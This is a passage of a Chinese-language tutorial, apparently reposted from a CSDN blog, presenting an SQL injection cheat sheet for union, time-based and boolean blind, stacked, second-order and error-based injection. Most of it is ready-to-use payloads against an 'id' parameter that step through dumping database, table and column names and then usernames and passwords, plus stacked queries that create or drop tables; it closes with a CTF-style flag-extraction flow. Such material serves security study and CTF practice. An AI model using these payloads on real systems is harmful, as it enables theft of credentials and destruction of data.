1,group_concat(id,username,password) from geekuser,3#</code></pre><p>(以上所用到的语句都属于联合注入，union select 开头的语句属于联合注入，这种注入有个前提条件，页面必须有回显位，如果页面没有回显位那就要考虑盲注，可直接在目录找到盲注相关内容)</p><h2 id="四、盲注"><a href="#四、盲注" class="headerlink" title="四、盲注"></a>四、盲注</h2><p>概念：在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试（说白了就是猜测内容），这个过程成为盲注</p><p>注意：盲注是不能通过直接显示的途径来获取数据库信息。在盲注中，需要根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响应时间不同）</p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><ul><li><strong>使用场景：</strong>无论我们输入的语句是否合法，页面的显示信息是<strong>固定</strong>的，即不会出现查询的信息，也不会出现报错信息。</li></ul><p>（可以尝试基于<strong>时间盲注</strong>来测试，根据<strong>页面响应的时间</strong>，来判断输入的信息是否正确）</p><ul><li><strong>本质：</strong>利用插入的sql语句执行造成时间延迟</li></ul><h5 id="第一步：判断参数构造"><a href="#第一步：判断参数构造" class="headerlink" title="第一步：判断参数构造"></a>第一步：判断参数构造</h5><blockquote><p>?id&#x3D;1’ and if(1&#x3D;1,sleep(6),1)–+</p></blockquote><p>如果 1&#x3D;1 成立，延迟 6 秒才访问成功</p><p>这里会一直加载中，知道达到 6 s，如果 条件不成立（比如：1 &#x3D; 2），那就会直接访问成功，不会转（当然了，实战时要确保网络正常，不然可能会出现误判）</p><h5 id="第二步：判断数据名长度"><a href="#第二步：判断数据名长度" class="headerlink" title="第二步：判断数据名长度"></a>第二步：判断数据名长度</h5><blockquote><p>?id&#x3D;1’and if(length((select database()))&#x3D;8,sleep(6),1)–+</p></blockquote><p>解释：如果数据库长度为 8 ，则条件成立，延迟 6 s，否则不延迟，这个数字需要大家自己慢慢去试</p><h5 id="第三步：爆破数据库名"><a href="#第三步：爆破数据库名" class="headerlink" title="第三步：爆破数据库名"></a>第三步：爆破数据库名</h5><p>方法一：</p><blockquote><p>?id&#x3D;1’ and if(ascii(substr((select <strong>database()</strong>),1,1))&#x3D;115,sleep(6),1)–+</p></blockquote><p>方法二：</p><blockquote><p>?id&#x3D;1’ and if(left(<strong>database()</strong>,1)&#x3D;’s’,sleep(6),1)–+</p></blockquote><h5 id="第四步：判断数据库表名长度"><a href="#第四步：判断数据库表名长度" class="headerlink" title="第四步：判断数据库表名长度"></a>第四步：判断数据库表名长度</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13,sleep(6),1)--+</code></pre><h5 id="第五步：爆破数据库表名"><a href="#第五步：爆破数据库表名" class="headerlink" title="第五步：爆破数据库表名"></a>第五步：爆破数据库表名</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101,sleep(6),1)--+</code></pre><p>刚开始判断的时候可以 &gt;97、&gt;99这样去快速逼近正确值，最后再用等号去确定</p><h5 id="第六步：爆破所有字段名长度"><a href="#第六步：爆破所有字段名长度" class="headerlink" title="第六步：爆破所有字段名长度"></a>第六步：爆破所有字段名长度</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))>20,sleep(6),1)--+</code></pre><p>这里的 users 是通过前面的爆破数据库表名爆破出来的，那一步没过，是到不了这一步的，只有确定了账号密码等信息在哪个表，哪个字段才行</p><h5 id="第七步：爆破字段名"><a href="#第七步：爆破字段名" class="headerlink" title="第七步：爆破字段名"></a>第七步：爆破字段名</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))>99,sleep(6),1)--+</code></pre><h5 id="第八步：判断字段内容长度"><a href="#第八步：判断字段内容长度" class="headerlink" title="第八步：判断字段内容长度"></a>第八步：判断字段内容长度</h5><p>假设得出存在 username、password等字段，那账号密码等数据大概率保存在这里面</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and if(length((select group_concat(username,password) from users))>109,sleep(6),1)--+</code></pre><h5 id="第九步：爆破字段内容"><a href="#第九步：爆破字段内容" class="headerlink" title="第九步：爆破字段内容"></a>第九步：爆破字段内容</h5><p>方法一：</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))=68,sleep(6),1)--+</code></pre><p>十进制 68 对应的 ASCII 字符是 D</p><p>方法二：</p><p>个人感觉方法二更快，方法一还得去 ASCII 表对着找</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and if(left((select group_concat(username,password) from users),1)=&#x27;D&#x27;,sleep(5),1)--+</code></pre><h4 id="-1"><a href="#-1" class="headerlink" title></a></h4><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h4><p><strong>使用场景：</strong>适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false</p><p>布尔盲注主要用到 <strong>length()<strong>、</strong>ascii()<strong>、</strong>substr()</strong> 这三个函数</p><p><strong>步骤：</strong></p><blockquote><p>1、先判断长度</p><p>2、在判断字符</p></blockquote><h5 id="第一步：判断数据库名长度"><a href="#第一步：判断数据库名长度" class="headerlink" title="第一步：判断数据库名长度"></a><strong>第一步：</strong>判断数据库名长度</h5><p>判断数据库名长度：</p><blockquote><p>?id&#x3D;1’ and length((select database()))&#x3D;8–+</p></blockquote><p>注意：1后面的 ‘ 是需要判断的，也有可能是 “ ，也可能是 ‘)、”) 这是语句里面的闭合符合，也可以是 &gt;8、&lt;8 之类的</p><p>若是在输入框中，and 要改成 or</p><h5 id="第二步：爆破数据库名"><a href="#第二步：爆破数据库名" class="headerlink" title="第二步：爆破数据库名"></a>第二步：爆破数据库名</h5><p>一个一个字符对着 ASCII 匹配，不难但是很耗时</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and ascii(substr((select database()),1,1))=115--+</code></pre><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">substr("788888",1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注因为要判断每一个字符，所以长度为一，后面就改变读取位置就可以了</code></pre><p>另一种方法：left()**</p><blockquote><p>?id&#x3D;1’ and left(database(),1)&#x3D;’s’ –+  （判断第一个字符是不是 s）</p></blockquote><h5 id="第三步：判断数据库表长度"><a href="#第三步：判断数据库表长度" class="headerlink" title="第三步：判断数据库表长度"></a>第三步：判断数据库表长度</h5><p>判断数据库表长度：</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29--+</code></pre><p>上面那条语句的意思是判断所有数据库表名的长度</p><h5 id="第四步：爆破表名"><a href="#第四步：爆破表名" class="headerlink" title="第四步：爆破表名"></a>第四步：爆破表名</h5><p>一个一个字符爆破表名</p><p>方法一：匹配字符</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99--+</code></pre><p>和上面一样，一个一个试，或者用脚本</p><p>方法二：直接匹配名字</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and (select table_name from information_schema.tables where table_schema=database() limit 2,1)=&#x27;uagents&#x27;--+</code></pre><h5 id="第五步：判断所有字段名长度"><a href="#第五步：判断所有字段名长度" class="headerlink" title="第五步：判断所有字段名长度"></a>第五步：判断所有字段名长度</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))=20--+</code></pre><h5 id="第六步：爆破字段名"><a href="#第六步：爆破字段名" class="headerlink" title="第六步：爆破字段名"></a>第六步：爆破字段名</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))>99--+</code></pre><p>同样也可以直接匹配名字：</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and (select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 1,1)=&#x27;username&#x27;--+</code></pre><p>最后匹配发现有：username、password （这两个是比较关键的）</p><h5 id="第七步：判断所有字段内容长度"><a href="#第七步：判断所有字段内容长度" class="headerlink" title="第七步：判断所有字段内容长度"></a>第七步：判断所有字段内容长度</h5><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and length((select group_concat(username,password) from users))>109--+</code></pre><h5 id="第八步：爆破字段值（匹配账号密码）"><a href="#第八步：爆破字段值（匹配账号密码）" class="headerlink" title="第八步：爆破字段值（匹配账号密码）"></a>第八步：爆破字段值（匹配账号密码）</h5><p>方法一：</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and ascii(substr((select group_concat(username,password) from users),1,1))>50--+</code></pre><p>方法二：</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and (select username from users where id=1)=&#x27;dumb&#x27;--+</code></pre><h2 id="五、堆叠注入"><a href="#五、堆叠注入" class="headerlink" title="五、堆叠注入"></a>五、堆叠注入</h2><p>概念：堆叠注入，也称堆查询注入，顾名思义就是多条语句同时执行。在SQL中，分号 ; 用来表示一条 sql 语句的结束。在 ; 结束一个sql语句后继续构造下一条语句，是否会一起执行？因此这个想法也就造就了堆叠注入，攻击就是利用此特点，在第二条语句中构造payload。</p><p>原理：很简单，mysql_multi_query() 支持多条sql语句同时执行</p><p>防范方法：使用 mysqli_ query() 函数，其只能执行一条语句，分号后面的内容将不会被执行；过滤特殊符</p><p>号 “ ; ”。</p><p>堆叠注入优点：联合查询 union 也可拼接语句（有局限性），但是堆叠注入能注入任意语句</p><p>当然了，堆叠注入的条件比较苛刻，可能受到API或者数据库引擎不支持的限制</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">未对 ";" 号进行过滤；未禁止执行多条sql语句</code></pre><p>举例一：</p><p>新建表，表名：test</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from users where id=1;create table test like users;</code></pre><p>删除表，表名：test</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from users where id=1;drop table test;</code></pre><p>……还有很多，可以自行搜索</p><h6 id="表结构："><a href="#表结构：" class="headerlink" title="表结构："></a>表结构：</h6><p>​        表结构就是定义数据表文件名，确定数据表包含哪些字段，各字段的字段名、字段类型、及宽度，并将这些数据输入到计算机当中。</p><pre><code>    查看字段值：            1&#39;;select 字段名 from `纯数字表名`;            1&#39;;select 字段名 from 非纯数字表名;</code></pre><h2 id="六、二次注入"><a href="#六、二次注入" class="headerlink" title="六、二次注入"></a>六、二次注入</h2><p>概念：</p><pre><code>    二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。二次注入是 SQL 注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</code></pre><p>原理：</p><pre><code>    在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在后端代码中可能会被转义，但是addslashes 有一个特点就是虽然参数在过滤后会添加  “\”  进行转义，但是 “\” 并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。数据中一般带有单引号和 ＃ 号，然后下次使用在拼凑 SQL 中。</code></pre><p>二次注入没有什么命令需要去记住，适合用于获取管理员登录权限的思路七、报错注入</p><h3 id="七、报错注入"><a href="#七、报错注入" class="headerlink" title="七、报错注入"></a>七、报错注入</h3><p><strong>使用场景：</strong>在联合查询无法实现的情况下可以尝试使用报错注入，比如说 <strong>union</strong> 被过滤</p><p><strong>理解</strong>：一般指页面没有回显，但是SQL语句执行可以输出<strong>错误信息</strong>的情况。报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p><p>相关函数：</p><p><strong>extractvalue (XML_document, XPath_string)</strong></p><p>​    第一个参数：XML_document 是目标XML文档<br>​    第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内   容，报错注入正是利用这一点<br><strong>updatexml (XML_document, XPath_string, new_value)</strong></p><p>第一个参数：XML_document 是目标XML文档<br>第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容，     报错注入正 是利用这一点<br>第三个参数：new_value 用来替换查找到的符合条件的数据<br>例如： 1’ or updatexml(1,concat(‘#’,database()),1)#，由于 # 不属于xpath语法格式，因此报出xpath语法错误。</p><p>①、extractvalue报错注入<br>❤ 爆破数据库名</p><p>1’ and (extractvalue(1,concat(0x5c,database(),0x5c)))#</p><p>❤ 爆破表格名</p><p>1’ and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x5c)))#</p><p>❤ 爆破字段名</p><p>1’ and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’表格名’),0x5c)))#</p><p>❤ 爆破字段值</p><p>1’ and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from 表格名),0x5c)))#</p><p>注意：</p><p>若是对于修改密码页面则需要另一种方法爆破对应用户密码</p><p>1’ and (extractvalue(1,concat(0x5c,(select password from (select password from users where username&#x3D;’想要爆破的用户名’) b) ,0x5c)))#</p><p>②、updatexml报错注入<br>❤ 爆破数据库名</p><p>1’ or updatexml(1,concat(‘#’,database()),1)#</p><p>❤ 爆破表格名</p><p>1’ or updatexml(1,concat(0x7e，select table_name from information_schema.tables where table_schema &#x3D; ‘数据库名’,0x7e),1)#</p><p>❤ 爆破表格字段</p><p>1’ or updatexml(1,concat(‘#’,select group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘表格名’),1)#</p><p>❤ 获取字段值</p><p>1’ or updatexml(1,concat(‘#’,select group_concat(id,username,password) from 表格名),1)#</p><p>❤爆破对应用户的密码</p><p>123’ and (updatexml(1,concat(0x5c,(select password from (select password from users where username&#x3D;’用户名’) b),0x5c),1))#</p><p>③、group by报错注入<br>推荐一篇文章，便于理解 group by 报错注入，该注入方法比较复杂</p><p>深入理解group by报错注入-CSDN博客</p><p>❤爆破数据库</p><p>123’ and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#</p><p>❤爆破出所有数据库表格</p><p>1’ and (select count(*) from information_schema.tables where table_schema&#x3D;database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e,floor(rand(0)*2)))#</p><p>❤爆破字段名</p><p>1’ and (select count(*) from information_schema.columns where table_schema&#x3D;database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e,floor(rand(0)*2)))#</p><p>❤爆破字段值</p><p>1’ and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#</p><p>❤爆破用户密码</p><p>1’ and (select 1 from(select count(*) from information_schema.columns where table_schema&#x3D;database() group by concat(0x7e,(select password from users where username&#x3D;’用户名’),0x7e,floor(rand(0)*2)))a)#</p><p>原文链接：<a href="https://blog.csdn.net/2301_79218813/article/details/135090595">https://blog.csdn.net/2301_79218813/article/details/135090595</a></p><p>SQL注入流程：</p><ol><li>是否存在注入并且判断注入类型</li><li>判断字段数 ‘ order by 数字 – ‘</li><li>确定回显点 -1 ‘ union select 1,2 – ‘</li><li>查询数据库信息 @@version @@datadir</li><li>查询用户名，数据库名 user() database()</li><li>查询表名 -1 ‘ union select 1,2, group_concat(table_name) from information_schema.tables where table_schema&#x3D;’数据库名’ – ‘</li><li>查询列名 -1 ‘ union select 1,2, group_concat(column_name) from information_schema.columns where table_name&#x3D;’表名’ – ‘</li><li>查询flag -1 ‘ union select 1,2, group_concat(flag所在的列名) from 表名</li></ol>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
